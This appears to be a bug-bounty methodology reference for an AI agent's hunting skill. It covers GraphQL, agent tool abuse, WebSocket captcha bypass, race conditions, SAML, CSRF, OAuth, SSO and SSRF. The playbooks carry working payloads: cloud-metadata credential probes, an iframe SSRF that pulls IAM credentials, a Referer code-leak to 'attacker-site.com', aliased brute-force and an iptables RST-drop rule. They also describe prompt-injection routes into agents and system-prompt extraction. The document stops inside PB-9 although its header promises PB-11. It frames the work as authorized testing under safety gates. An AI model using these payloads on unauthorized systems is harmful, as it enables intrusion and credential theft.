# Reference — Bug Bounty Hunting Playbooks & Report-Quality Triage

Companion to the `hunt` skill (`../SKILL.md`). Covers: expanded method detail for the eleven bug-bounty playbooks (PB-1–PB-11), program-scope and report-quality triage detail, provenance caveats, and FP-rule refinements.

All techniques are for authorized testing only — targets named in the scope manifest, entitled labs, or programs whose written policy permits the technique. Step gates (G0–G3) are defined in `../../safety-gates`; this reference adds the method depth beneath those gates. Report triage and harm-gate mechanics point at `../../reporter`. Where a source is self-published or partially unverifiable, that is stated — no technique is asserted beyond what its source documents.

---

# PART 1 — PLAYBOOK EXPANSIONS (PB-1–PB-11)

## PB-1 — GraphQL: introspection-to-takeover

**Provenance:** The XSS Rat / Wesley Thijs, "GraphQL Is a Gift to Bug Hunters — Introspection-to-Takeover Workflow" (2026-11-10), corroborated with PortSwigger, HackTricks, and OWASP material cited within it. The author's standing rule: run everything against "targets you own, deliberately-vulnerable labs, or programs where you have written permission" — aliased brute-force "against someone else's login is a crime, not a flex".

### Expanded method

**Discovery:**
- Candidate paths: `/graphql`, `/graphiql`, `/graphql.php`, `/graphql/console`, `/api`, `/api/graphql`, `/graphql/api`, `/graphql/graphql` plus `/v1` variants.
- Universal probe (works where other probes 404): `POST {"query":"query{__typename}"}` — any body containing `"data":{"__typename":"query"}` confirms GraphQL.
- Grep loaded JS bundles for `mutation`/`query` fragments to find hidden endpoints.
- Fingerprint the engine (graphw00f: Apollo vs graphql-java vs ruby) — bypass behavior and suggestion errors differ per implementation.

**Introspection:**
- Quick probe: `{"query":"{__schema{queryType{name}}}"}`.
- Full standard query: `query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } }` — the `onOperation`/`onFragment`/`onField` directive declarations "often need to be deleted to run" (PortSwigger).
- Feed the dump to InQL or GraphQL Voyager for an entity map.

**Introspection-blocked bypasses:**
- Regex blocks usually cover only the literal `__schema{` — insert parser-ignored characters: `{"query":"query{__schema\n{queryType{name}}}"}`.
- Retry as GET (`GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D`) and as `x-www-form-urlencoded` POST — blocks frequently cover only JSON POST bodies.

**Schema recovery without introspection:**
- Request a nonsense field (`usr`) and harvest the Apollo suggestion error — OWASP quotes the shape `Did you mean "user?"`.
- Automate: `pip install clairvoyance && clairvoyance https://target/graphql -o schema.json` (Docker: `docker run --rm nikitastupin/clairvoyance`) with Escape-Technologies/graphql-wordlist or google-10000-english. InQL v6.1+ batches candidate fields against suggestion errors.

**Schema reading → access control:**
- Enumerate every Mutation + input args; check Relay fields: `cat schema.json | jq '.data.__schema.types[] | select(.name=="Query") | .fields[].name' | grep node`.
- Probe object-level auth with two of your own accounts: PortSwigger's `query { product(id: 3) { id name listed } }` shape (delisted object) and cross-account `updateProfile(username:...)` mutations. Auth wired "to the front door" but forgotten per-resolver is the BOLA/ATO pivot.

**Abuse primitives — authorized targets only:**
- Aliased single-POST shape: `mutation{bruteforce0:login(input:{username:"...",password:"..."}){token success}}` … `bruteforce99:...` — delete the `variables` dict and `operationName`; search the response for the alias returning `true`/a token. Request-count rate limiters are architecturally defeated by aliases and JSON-array batching (`[{"query":"..."},{"query":"..."}]`). **Gate note:** the credential-guessing variant is prohibited on live targets by the safety gates (`../../safety-gates`) — demonstrate limiter bypass with harmless aliased operations on authorized targets and practice the credential variant only in labs (e.g., PortSwigger race/GraphQL labs). Scope-proof (the program-policy line permitting credential attacks) must accompany any such evidence or the report is dead on triage.
- GET-mutation check: `curl -G https://target/graphql --data-urlencode 'query=mutation{updateEmail(email:"attacker-owned@example.com"){id}}'` — against your own test account.
- ATO candidates = identity mutations: password-reset, email-change, OTP, token-issuance — especially arbitrary `username`/`email` args (one-POST takeover).

**Tooling:** Burp Repeater ("Send group in parallel" for race variants), clairvoyance, InQL (`python3 inql.py -t <url> -o output.json`), GraphQLmap (`python3 graphql-map.py --url <url>`), graphql-cop (misconfig scan: introspection on, GET executes mutations, GraphiQL exposed), graphw00f, GraphQL Voyager (spot `node`, federation `_service{sdl}`, cross-type paths worth auth-testing), HackTricks endpoint path list.

**Evidence requirements:** full request/response pairs; the schema map excerpt showing the exposed sensitive surface; per-account access-control diff (account A vs B).

**FP-rule refinement (extends the GraphQL rule in the FP rules below):** introspection/schema visibility is not automatically a vulnerability — price by what the map exposes. Conversely, a 200 with an errors array is where access-control bugs hide — read error bodies, not status codes; a successful aliased/batched response requires committed-state verification, not response parsing alone.

## PB-2 — AI agent tool abuse (confused deputy)

**Provenance:** Vignesh Kumar, "How I Hunt for Bugs in AI Agent Tools", vendor-doc-verified metadata probes. Framing references: Simon Willison's "lethal trifecta" (private data + untrusted content + external communication) and OWASP GenAI LLM06:2025 Excessive Agency.

### Expanded method

**Capability map:** locate the tool-registration list (article's shape: `Agent(model=model, tools=[read_source_code_file, fetch_url, run_shell, query_db])`); per tool record WHAT resource it touches (filesystem, network, shell, DB, cloud API, anything that sends — email/webhooks/payments) and WHAT privilege it runs with. Star tools with ambient authority over sensitive resources.

**Input map:** direct input; retrieved documents (the RAG index is itself an input surface); job files the agent reads (requirements.md, issues, READMEs, configs); fetched web pages/API responses; tool outputs fed back into context. To the model these are just tokens — that is the indirect-prompt-injection steering mechanism.

**Sink matching:** reads a path → CWE-22; fetches a URL → CWE-918 (especially toward cloud metadata); runs a command → CWE-78; queries a DB → CWE-89/CWE-639; renders a template → SSTI/XSS; parses serialized data → insecure deserialization. "The LLM invents no new bug classes — it is the old sink with a model holding the pen."

**Reading tools for absences (high-yield):**
- File tool: is the path resolved/confined to a root, or does it `open()` whatever string it's handed? Comparing resolved paths (e.g., `Path.resolve()` on both sides) is the fix; filtering `..` from input is bypassable.
- URL tool: host allowlist? Private/link-local blocking **after DNS resolution**? Blind redirects?
- Command tool: `shell=True` or string concat?
- Query tool: parameterized statements; caller identity vs god-mode service account.
- Docs-vs-code gap: the reference case's AWS tool threat model claimed "bounded, read-only filesystem access" while code enforced nothing.
- Unused safe sibling: a neighboring package resolved every path through `_resolve_safe()`; the vulnerable `read_source_code_file` never called it. Reference vulnerable shape: `read_source_code_file(file_path: str, max_lines: int = 200)` with `Path(file_path)` + `p.read_text(...)` and no confinement.

**Direct sink PoC (no model in the loop):**
- `python -c "from the_tool import read_source_code_file; print(read_source_code_file('/etc/passwd')[:200])"` — or, for the honest variant, read a benign file you planted outside the project (`/tmp/outside-project/secret.txt` containing `FAKE_TOKEN=not-a-real-key`). Deterministic, no credentials, no cloud account. **Never exfiltrate real secrets** (see `../../safety-gates`).

**Cloud metadata probes (vendor-doc verified):**
- AWS IMDSv1: plain GET `http://169.254.169.254/latest/meta-data/`; IMDSv2: `curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` then `curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/` (401 without token when required; IPv6 `fd00:ec2::254`; PUT carrying X-Forwarded-For rejected).
- GCP: `curl "http://metadata.google.internal/computeMetadata/v1/instance/image" -H "Metadata-Flavor: Google"` (alt: `http://169.254.169.254/computeMetadata/v1`, `http://[fd20:ce::254]/computeMetadata/v1`; denied without the header; X-Forwarded-For rejected).
- Azure: `curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2025-04-07"` (requires `Metadata: true`, must NOT carry X-Forwarded-For; managed-identity tokens at `/metadata/identity`).

**URL-filter bypass shapes (PortSwigger, per the digest):** blacklist — `127.0.0.1` encodings (2130706433, 017700000001, 127.1), a domain you register resolving to 127.0.0.1, URL-encoding/case variation, http→https redirect switch; whitelist — parser inconsistencies `https://expected-host:fakepassword@evil-host`, `https://evil-host#expected-host`, `https://expected-host.evil-host`. **Caveat:** the PortSwigger payload wordlists were JS-rendered and could not be extracted in the research pass — only the page skeleton was retrievable; use the named shapes, not a claimed full wordlist.

**Fix pattern (the reference fix shipped with regression tests for traversal, absolute paths, symlink escape):** resolve project root; resolve the requested path with `Path.resolve()` (follows symlinks, closing the symlink-pointing-outside escape); reject anything not inside the root — comparing **resolved** paths, not strings.

**FP-rule refinement:** a tool accepting a traversal path in code review is a finding only when the tool actually runs with ambient authority — prove the sink with the direct call; a model *declining* in conversation is not evidence the boundary exists ("a security boundary should never depend on the model choosing to decline").

## PB-3 — WebSocket event protocols and captcha-gated agent endpoints

**Provenance caveat (verbatim from the digest):** self-published writeup with an anonymized target — the author's own report, not independently verified; the printed CVSS vector is a placeholder ("AV/AC/PR/UI/S/C/I/A"), not a valid CVSS string — recompute your own. Generalize the method, re-verify every step on your target.

### Expanded method

1. **Connect unauthenticated and enumerate the protocol from the handshake:** `wscat -c "wss://<host>/ws?app_type=web&origin_domain=<configured>&origin_shop=<configured>"` → `connection_established` with `session_id`, `timestamp`, `turnstile_site_key` — the site key reveals the gate and hands over the client widget config.
2. **Baseline the gate:** send `{"event":"system_prompt","action":"get"}` immediately after connect; capture the denial `{"event":"error","payload":{"type":"auth_required","code":403,...}}`.
3. **Null-token bypass on the same socket:** `{"event":"captcha_verify","payload":{"token":""}}` → `{"event":"captcha_result","payload":{"success":true}}` — backend treats the client-submitted event itself as proof instead of calling the verification API.
4. **Token-fuzz matrix:** same event with `"AAAA-not-a-real-captcha-token"`, whitespace `" "`, and payload key omitted — variants passing means no token validation exists at all.
5. **Re-send the privileged event:** the previously-403'd event returns the system prompt and tool catalogue; bypassing the model's conversational "never reveal" guardrails because this is a **dedicated server event**. Classification: OWASP GenAI LLM07:2025 System Prompt Leakage (MITRE ATLAS AML.T0051.000).
6. **Know the correct control** (Cloudflare docs): backend must POST `https://challenges.cloudflare.com/turnstile/v0/siteverify` with secret + response (+ optional remoteip); tokens max 2048 chars, valid 300 s, single-use (reuse/expiry → `timeout-or-duplicate`; garbage → `invalid-input-response`); check the response `hostname` and `action` fields.
7. **Replay across every production deployment** of the same verification layer — systemic vs one-off.
8. **Generalize:** grep client JS bundles and live WS traffic for event names like `captcha_verify`, `guest`, `system_prompt`; hunt "client asserts it passed verification, server believes it" everywhere, not just CAPTCHA widgets.

**Tooling:** wscat (`sudo npm install -g wscat`), browser DevTools WS frame inspector (Network → WS) for the event vocabulary, the siteverify API contract as the named missing control.

**FP-rule refinement:** a successful WS handshake does not demonstrate authorization failure (existing rule); a rendered CAPTCHA widget is likewise not enforcement — the server-side siteverify decision is the control. Baseline-before-bypass (403 → success → disclosure on the same socket) is the airtight before/after diff that survives triage disputes.

**Boundary:** demonstrate the absence of server-side validation only. No challenge-solving automation, no third-party verification tampering, no evasion.

## PB-4 — Race conditions: single-endpoint TOCTOU and HTTP/2 single-packet

**Provenance:** [Shahzad-Race] — Facebook 2016 case study of Josip Franjković's contact-point confirmation race. [T4nv1] — "$10,000 single-packet race" writeup; **body member-only** — the verified intro names "HTTP/2 frame multiplexing and the Single-Packet Attack (TCP sync head-of-line blocking)" → "a high-concurrency state window bypass on a financial SaaS platform"; the technique below is reconstructed from corroborating public sources (PortSwigger race-conditions material, Kettle's "Smashing the state machine", Turbo Intruder docs, flatt.tech); the LB-doing-TLS-termination + H2→H1.1-translation detail is search-reconstructed, medium confidence. **Fact-check note:** the "~1,500-byte TCP soft limit" sometimes quoted is an Ethernet-MTU/MSS inference — the fetched sources state only "up to 20-30 HTTP requests with a single packet" (Kettle, who suggests "forcing the maximum segment size up") and frame first-sequence-sync against the 65,535-byte TCP limit; do not cite 1,500 bytes as sourced.

### A — Single-endpoint TOCTOU on identity flows

1. Recon: identify the endpoint writing the pending contact point and the one consuming the confirmation secret; the smell is a pending-value write not serialized against token issuance/consumption.
2. Test account + API token; two values: an owned mailbox + an unused address you legally control and receive no mail at (never a third party's real address).
3. Capture the exact write request; learn parameter anatomy from a real confirmation email to your own address (2016 shape: `/confirmemail.php?e=<email>&c=<your-email-code>&code=<confirm-code>` — `c` is always the owned address's code while `code` confirms whichever address won the race).
4. [G3] Fire simultaneous requests to the write endpoint, alternating the contact value between the two addresses, in tight batches, looping within budget — discovery took ~5,000 requests historically; the reproducible PoC came from batching simultaneous alternating requests (Burp Repeater group "Send group in parallel"; Burp ≥ 2023.9).
5. Harvest the cross-boundary artifact in the owned mailbox; redeem it to mark the unused address confirmed without ever receiving mail there.
6. Capture interleaving evidence + full request/response pairs — a sibling reporter explicitly warned to attach full POST requests and responses or triage cannot reproduce.
7. Defense-side test (the case's own remediation, executable): submit two distinct contact values simultaneously, assert each confirmation secret confirms only itself. Implementation pattern: store `{account, purpose, normalized contact}` on the token; `SELECT ... FOR UPDATE` on token and account rows in one transaction; increment the attempts counter; verify with `hmac.compare_digest`; commit; **only THEN raise** (raising inside the transaction rolls back the counter). General rule: "two overlapping updates must not retarget an in-flight token".

Prior art from the same source: Keybase invite-limit bypass (hackerone.com/reports/115007), Keybase multi-registration with one invite (148609), Cobalt.io BTC withdrawal reuse, Facebook ad-coupon one-per-account race, Mega.nz coupon reuse.

### B — HTTP/2 single-packet race [G3 throughout]

- **Mechanics:** one HTTP/2 connection; send every request withholding a tiny final fragment so none starts processing; release all at once — the OS groups them into one TCP packet and the server processes them "at the same time, regardless of how much network jitter delayed their delivery". HTTP/1.1 pipelining fails (requests "have to be sequential").
- **Withhold semantics:** withholding END_STREAM alone "will break on certain HTTP/2 server implementations that use the content-length header" — hold back a DATA fragment per stream; disable TCP_NODELAY (Nagle batches final frames); send a PING first to warm the connection.
- **Turbo Intruder:** `RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)`; queue ~20 requests with `engine.queue(target.req, gate='race1')`; release with `engine.openGate('race1')` — "All gated requests are sent in a single TCP packet". Base script `resources/examples/race-single-packet-attack.py`; manual equivalent = Burp Repeater tab groups. Diagnostics: `req.order` ranks responses (0 = first); "A negative timestamp in results indicates the server responded before the request was fully sent".
- **Front-end mismatch:** front-ends "may decide to forward some requests over existing connections to the back-end, and to create fresh connections for others" — do server-side connection warming (a few inconsequential requests first) to pin a stable backend path; front-end routing is often per-connection. The exploitable "mismatch" is where front-end enforcement (TLS termination, H2→H1.1 translation, counting) and backend reality diverge.
- **Concurrency ceiling:** respect `SETTINGS_MAX_CONCURRENT_STREAMS` — Apache httpd 100, Nginx 128, Go 250, nghttp2/Node.js 4294967295 (RFC 9113 initial unlimited, recommended ≥100); exceeding yields PROTOCOL_ERROR or REFUSED_STREAM (auto-retryable).
- **Scaling — first-sequence sync (laboratory only):** IP fragmentation (RFC 791 — reassembly only when all fragments arrive) to withhold the packet carrying the FIRST sequence number; the server buffers out-of-order traffic and processes it at once when the missing fragment lands. Reference: github.com/Ry0taK/first-sequence-sync (rc-benchmark, rc-pin-bypass) — 10,000 requests in ~166 ms; 1,000 guesses against a 5-attempt limit; suppress RSTs with `iptables -A OUTPUT -p tcp --tcp-flags RST RST -s <IP> -j DROP`.
- **Fallbacks:** no HTTP/2 → last-byte sync, `Engine.THREADED`/`Engine.BURP`, `concurrentConnections=20` (~4 ms median spread vs ~1 ms single-packet; hours vs ~30 s on a real target). HTTP/3 → `Engine.HTTP3`, `gateMode` auto/'sda'/'qpack'. Prepend a connection-warming GET to separate back-end connection delay from endpoint processing delay; if the server serializes per session (PHP session lock), resend each request with a different session token.
- **Flow-control physics:** only DATA frames count against the window; initial window 65,535 octets; `SETTINGS_INITIAL_WINDOW_SIZE` (0x04); endpoints MUST process frames from the TCP receive buffer as soon as available (RFC 9113 §5.2.2).

**Evidence bar:** per-request response order/timestamps and the exact engine config — sync quality is the evidence, never "sometimes it worked". Two successful HTTP responses do not establish two committed business operations (existing FP rule) — add committed-state inspection (the confirmed flag, the double credit, the second redemption) as the impact artifact. Target classes: rate limits, OTP/verification, coupon/fund redemption.

## PB-5 — SAML assertion confusion

**Provenance:** Slack / Sanso disclosure (blog.intothesymmetry.com/2017/10/slack-saml-authentication-bypass.html), $3,000; reported 02-05-2017, confirmed 03-05-2017, bounty 26-08-2017, closed 26-10-2017 (~6 months) — timeline verified verbatim. **Fact-check-corrected attribution:** Sanso's motivation was Ioannis Kakavas — "a serious vulnerability in the SAML implementation of Microsoft and Github"; "The Github incident gave me the final motivation to start learning it". His post never mentions SSOCircle — do not repeat that attribution. **Reconstruction caveat:** neither the post nor the TechTarget analysis discloses how the GitHub-signed assertion passed Slack's signature verification, and no raw request/response was published — only the endpoint, the tool, and the failed checks are public.

### Expanded method

1. **Checklist (OWASP SAML Security Cheat Sheet):** Audience vs SP EntityID; Destination vs ACS URL; Recipient/InResponseTo/SubjectConfirmationData; NotBefore/NotOnOrAfter; signature ≥ RSA-SHA256; signature-reference coverage; static key pinning (ignore KeyInfo).
2. **Archive:** capture and archive every SAMLResponse you legitimately receive — the exploit material was "an old and expired Github's Assertion I had saved somewhere in my archive"; expired/foreign-SP material is valid test input.
3. **Inventory:** SAML-enabled services you hold accounts on; prioritize in-scope ones. Slack reference ACS: `https://<workspace>.slack.com/sso/saml` (Enterprise Grid: `https://<org>.enterprise.slack.com/sso/saml`); audience/EntityID `https://slack.com` (confirmed via Slack's own help article).
4. **Replay [G3]:** POST the saved foreign-SP/expired assertion in the `SAMLResponse` field to the target ACS; observe whether a session is issued and as which subject. The Slack case accepted an **expired** assertion scoped to **GitHub** ("yes the assertion was also expired!!") and named a subject that was not the reporter ("the username was not asanso aka me").
5. **Single-variable isolation [G3]:** if rejected, mutate one condition at a time (Audience only, Destination only, timestamps only) to map which checks exist — the failing-check matrix equals the remediation test list.
6. **Replay/duplicate + unsolicited [G3]:** resubmit the identical assertion twice — the SP must consume assertion IDs in a committed transaction BEFORE issuing the session (OWASP, per SAML Profiles 4.1.5); submit an IdP-initiated response with no InResponseTo and verify response/assertion-level replay detection.
7. **XSW [G3]:** SAML Raider's 8 one-click XML Signature Wrapping variants; verify the `ds:Reference` URI covers the assertion actually used for authentication; reject assertions outside the signed content.
8. **Stop at proof:** "I stopped quite immediately and open a ticket on Hackerone" — file each failing check separately.

**Tooling:** SAML Raider (CompassSecurity; BApp Store id c61cfa893bb14db4b01775554f7b802e — sign/remove/edit, X.509 import/export/clone/self-sign, 8 XSW variants, XML/Base64 editor); Burp Repeater ACS probes; personal saved-assertion archive.

**FP-rule refinement:** a signed assertion replayed is not a finding until the SP issues a session — capture the issued session and its subject as the impact artifact. Anchor lesson: "A signature proves who issued the assertion, not that it was minted for you." Independent failed checks compound — enumerate each separately. Enterprise SSO remediation is slow: next-day confirmation, ~6 months to close.

## PB-6 — CSRF: token issued, never validated

**Provenance:** Whitton's Messenger.com site-wide CSRF + Mazin Ahmed's June 2015 PoCs. Confirmed case: `POST https://www.messenger.com/settings/edit/` body `settings[sound_enabled]=false&__a=1` with NO `fb_dtsg` → 200 OK, normal payload — setting changed.

### Expanded method

1. Identify the token param + companions (`fb_dtsg`, `__user`, `__a=1`, `__dyn`, `__req`, `ttstamp`, `__rev`); record normal success.
2. Learn the failure signature first: the reference app redirected to `/common/invalid_request.php` or errored (depending on the `__a=1` AJAX flag) when validation fired — normal success JSON after tampering = the check does not exist. This is your oracle for "check fired" vs "no check".
3. Five-variant tamper matrix per captured request: (1) send normally; (2) remove the ENTIRE token parameter (PortSwigger: "remove the entire parameter containing the token (not just its value)"); (3) alter one character, same length; (4) empty the value keeping the param; (5) POST→GET (GET must never mutate data). Any variant matching step 1 = likely vulnerable.
4. Strongest artifact: identical 200 OK success JSON with the token fully deleted.
5. Scope: repeat on several distinct mutating endpoints (`/chat/remove_participants/` shape in the source) → site-wide middleware absence vs endpoint-scoped; conclude "missing on every request" after 2–3 all-pass, then test high-value routes for impact.
6. Cross-site PoC (Mazin Ahmed shapes, owned victim sessions only): auto-submitting form `<body onload="javascript:document.csrf_form.submit()">` POSTing attacker-chosen message content / thread deletion / settings flips to your own second account.
7. Validated-token escalation variants (PortSwigger): method-dependent validation (checked on POST, skipped on GET); token not tied to the session (global pool — use your own valid token in the attack); token bound to a non-session cookie (plant your csrfKey via a sibling subdomain you own); double-submit in a cookie (invent matching parameter+cookie values).
8. Login CSRF (pairs with PB-7 step 8): forgeable cross-site GET to login/OAuth start silently logging your own test victim into your own attacker account; provider-side `state` protection stays intact.
9. Fix verification: re-run the full matrix post-fix ("tokens are now properly checked on every request" was the confirmed fix). Ship the remediation: default-deny token enforcement in shared middleware with reviewed opt-outs; constant-time comparison where missing/empty fail identically to wrong; no state changes over GET/HEAD; layered SameSite + Origin/Sec-Fetch-Site checks; CI regression tests asserting the negative cases per mutating route ("a CSRF suite that only checks success proves nothing").

**FP-rule refinement (inverse of the existing rule):** a missing explicit token is not always exploitable (existing) — AND a present token is not proof of validation: prove enforcement with the tamper matrix plus the app's expected failure signature.

## PB-7 — OAuth code/token leakage, redirect validation, and low-severity chaining to private-repo takeover

**Provenance:** GitHub 2014 chain reconstructed from Egor Homakov's original disclosure ("How I hacked Github again", Feb 7 2014) — the case study that summarized it is AI-assisted and credits Homakov for all facts; Airbnb chain from Arne Swinnen's 2016 disclosure ($5,000, awarded 27/09/2016). The app IDs and URLs below are 2016 registered values from the disclosure — historical, cited as disclosed.

### GitHub-2014 chain shapes

- **Redirect validation bypass:** `https://github.com/login/oauth/authorize?client_id=7e0a3cd836d3e544dbd9&redirect_uri=https%3A%2F%2Fgist.github.com%2Fauth%2Fgithub%2Fcallback/../../../homakov/8820324&response_type=code` — a "path must be a subdirectory of the callback" check passes while the browser normalizes the Location to an attacker-reachable URL on the same origin.
- **Code-binding test:** RFC 6749 §4.1.3 — redirect_uri at the token endpoint "MUST be identical" to the authorization request; §4.1.2 binds the code to "the client identifier and redirection URI". Exchange: `POST https://github.com/login/oauth/access_token` with `client_id, client_secret, code, redirect_uri` (default form-encoded response); codes expire in ~10 minutes per current GitHub docs — redemption must be immediate.
- **Referer-based code exfiltration:** inject `<img src="///attacker-site.com/logo.png">` into user content on the callback origin — the triple-slash URL parses as path-relative to Ruby's URI library (passing the Camo proxy) while Chrome/Firefox treat it as protocol-relative, so the victim's browser fetches the attacker host with the leaked `?code=` in the Referer. Script-less, NoScript-proof. Observe via a logging endpoint or Burp Collaborator.
- **Silent scope escalation:** append `&scope=repo,gists,user,delete_repo,notifications` to the crafted authorize URL — 2014 GitHub auto-approved any scope for pre-approved official clients with no consent prompt, upgrading a gists-only token to full private-repo read/write. Scope semantics are the impact multiplier: `repo` = "full access to public and private repositories including read and write access to code" — private-code write access is supply-chain risk.
- **Session takeover:** `GET https://gist.github.com/auth/github/callback?code=CODE` establishes a logged-in session as the victim.
- **Token extraction from session cookies:** Base64-decode the Rails `_*_session` cookie → Ruby `Marshal.load` surfaces the raw provider token inside the signed (not encrypted) session. Rails 5.2+ encrypted cookies and server-side stores close this.
- **Modern detection angles (GitHub docs):** exact-match redirect is the default; wildcard matching is opt-in and explicitly warned to "allow an attacker to send authorization codes to any subdomain or subdirectory of the callback URL"; omitting `scope` for returning users issues a token combining all previously authorized scopes and "the authorization prompt is skipped" — test both; verify PKCE enforcement (S256-only, 43-char verifier; `plain` unsupported; `state` strongly recommended).

### Airbnb-2016 chain shapes

- **Referer-driven post-OAuth redirect:** from an attacker page embed `<object data="https://<target>/oauth_connect?from=google_login&service=google">`; when the victim is already logged in, the callback redirects to wherever the initiating request's Referer points. Only `/oauth_connect`/`/oauth_callback` were affected; `/authenticate` and the `redirect_params` controller were NOT — map the exact triggering path first.
- **Login-CSRF planting:** the same embedded object fires a forgeable cross-site GET that silently logs the victim into the ATTACKER'S own account, storing the attacker-controlled Referer as the victim's return address. Provider-side `state` stays intact — the callback URI is never modified.
- **response_type substitution:** send the victim to the provider auth URL with `response_type=code,token` instead of `code`, redirect_uri byte-identical — tokens arrive in `location.hash`, readable by any origin's JS after redirects. Capture page: `if (window.location.hash) { alert(window.location.hash); window.stop(); }` plus the object-switch chain for the login-CSRF step.
- **Monetize both token types:** the untouched redirect_uri means the `code` still exchanges for a web session as the victim (demonstrated in the PoC video). The writeup describes the mobile path — the app "did use an identity provider's long-term access_token to authenticate a user transparently under the hood" and swapping the stored token on a rooted phone would authenticate as the victim — **but a performed rooted-phone demo is not explicitly described; verify each token's impact separately.**
- **Server-side fixes (the writeup's own analysis):** never derive redirects from Referer — persist the return path server-side at flow start and validate relative-only (`starts with '/'`, `not '//'`), allowlist-prefixed; reject OAuth initiation when `Sec-Fetch-Site` is `cross-site` and bind `state` to a pre-session cookie the attacker cannot set; treat `response_type=token` fragments at a code-expecting callback as an anomaly and terminate WITHOUT redirecting; stop accepting bare IdP access_tokens as mobile login — use PKCE with backend code exchange.

**FP-rule refinement:** a code appearing in a Referer is not leakage until it lands on attacker-controlled logging; a captured code must be shown redeemable (token exchange or session) to count as impact.

## PB-8 — SSO audience confusion and upload-parser reach

**Provenance:** Hacktron AI's OpenAI/Discourse chain (Harsh Jaiswal/rootxharsh, Mohan Pedhapati/s1r1us, Rahul Maini/iamnoooob; original writeup hacktron.ai/blog/hacking-openai dated 2026-09-13; CVE-2026-32882). **Verification gaps:** no token-level detail published (no aud/scope values, no endpoints); NVD returned a JS-gated landing page for the CVE and GitHub Advisory search returned no results — the CVE ID is corroborated solely via the Discourse advisory (GHSA-vhm9-85gw-x335, CVSS 3.1 8.8, published by davidtaylorhq); the internal PR and repo are unverifiable by design.

### Expanded method

1. **Enumerate every app behind the shared identity provider** and rank surfaces by trust — the core finding came from mapping service boundaries, not endpoint fuzzing.
2. **Mint a session on the least-trusted surface** (the forum in the reference case) and export its cookie/JWT verbatim; decode offline: `jq -R 'split(".") | .[1] | @base64d'` or jwt.io — the claim values you inspect are your own observations.
3. **Replay that exact token against each higher-trust sibling** (fresh browser profile, or `curl -H 'Cookie: <forum-token>' https://<sibling-app>/`), then hit an authenticated endpoint. RFC 9700 §2.3 makes it a MUST for resource servers to refuse tokens whose audience doesn't match — acceptance of a low-trust-surface token by a high-trust surface is the finding; cite the RFC in triage.
4. **Audit upload validation for decoder fall-through:** the reference stack used FastImage (does not parse HEIF/AVIF), so `.heic` uploads skipped it and went straight to ImageMagick's `magick`, exposing libheif to attacker-controlled bytes. Check every app that accepts image formats its primary validator cannot decode.
5. **Hunt silent upstream fixes:** find bug-fix commits in decoder libraries never tagged as security fixes and without a CVE, then verify the distro package lacks them — `git log` the upstream library; `apt-cache policy libheif` on the app's actual container base (reference case: Debian 12 shipped vulnerable libheif 1.19.7; Debian's fix landed Aug 8, 2026; Debian 13 still shipped 1.19.8 at report time). "Patched upstream" is not "patched in deployment".
6. **Memory-corruption validation [G3, own instance only]:** trigger and validate against your own instance of the same software, never the target (reference team validated on their own Discourse Cloud instance first, then the real forum — validation on the real target was disclosed honestly and did not block the payout; testing outside scope must be disclosed, not hidden).
7. **Prove cross-service impact with one reversible action** (reference: one benign README-renaming PR from a hijacked employee session), then stop.

**Tooling:** token decode (`jq`/jwt.io); curl replay; Discourse remediation reference (`git pull` + `./launcher rebuild app`; ImageMagick `security policy.xml` format restriction; upstream libheif v1.23.4 cited as the security release). Program plumbing: OpenAI on Bugcrowd, Discourse on HackerOne.

**FP-rule refinement:** a token accepted by a sibling app is a finding only with the authenticated endpoint succeeding — record the endpoint and the response. Anchor lessons: the payable bug was identity architecture, not memory corruption ($6,500 explicitly for the OpenAI-side SSO finding; testing the Discourse-hosted forum was excluded from bounty scope); validation coverage gaps redirect attack surface to the strongest parser available.

## PB-9 — SSRF through HTML-to-PDF export pipelines

**Provenance:** HackerOne report #2262382 — "Server Side Request Forgery (SSRF) via Analytics Reports"; reporter megaman_ (signed @Mega7); $25,000 formatted bounty; final rating Critical 10.0 (author_type Team); full CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N/CR:H/IR:H/AR:H. **Fact-check boundaries:** the public disclosure redacts the endpoint and PoC (███ blocks); the "severity history 8.8 → 9.8 → 10.0" is NOT verifiable from the public disclosure (only the final rating shows); the reporter's conclusion states "Unauthorized Access to AWS Credentials" (the AccessKeyId/SecretAccessKey phrasing is a paraphrase); the 169.254.169.254 payload below is the prior-art AppSecCo technique — an inference for this target, not disclosed text. Verified verbatim: the team summary that `element[:template]` was unsanitized in an error message and `html_without_layout` was "fed into a library that converts this into a PDF"; the fix diff (`- "Missing template for element: #{element[:template]}"` → `+ "Missing template for element"`); the one-word Impact section "SSRF."; the vendor's "stopping at the right point in testing".

### Expanded method

1. **Map export endpoints:** analytics reports, invoices, dashboards, ID cards — anywhere user-controllable fields flow into rendered HTML for server-side conversion.
2. **Benign-markup survival probe:** inject a stray `</iframe>`; "generating the PDF caused the iframe to be rendered in the downloaded PDF as well" proves server-side rendering.
3. **Error-path reflection:** deliberately trigger error conditions — the only vector in the reference case was `"Missing template for element: #{element[:template]}"` interpolating the user value into `html_without_layout` fed to the PDF library. Audit every interpolation landing in rendered HTML, especially exception paths nobody sanitizes.
4. **Confirm blind SSRF first:** point the injected markup at an out-of-band listener (Burp Collaborator/OAST); a DNS+HTTP callback from the app server's IP distinguishes server-side rendering from client behavior. Keep the listener within the permitted controlled endpoints.
5. **Internal pivoting [G3]:** the AppSecCo two-step — `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>` lists role names, then the role-specific path renders credential JSON into the PDF. Requires the G3 gate (internal-network reachability — `../../safety-gates`); per-cloud header requirements decide what can work (see PB-2 probes; Azure headerless fallback `/metadata/v1/instanceinfo`; ECS creds at `http://169.254.170.2/v2/credentials/<GUID>`; IPv6 alias `http://[fd00:ec2::254]` bypasses IPv4-only filters).
6. **Credential validation:** present redacted evidence and request owner-side validation — the safety gates (`../../safety-gates`) prohibit using discovered production credentials to obtain deeper access; `aws sts get-caller-identity` / enumerate-iam (github.com/andresriancho/enumerate-iam) runs only in lab or owner-approved settings.
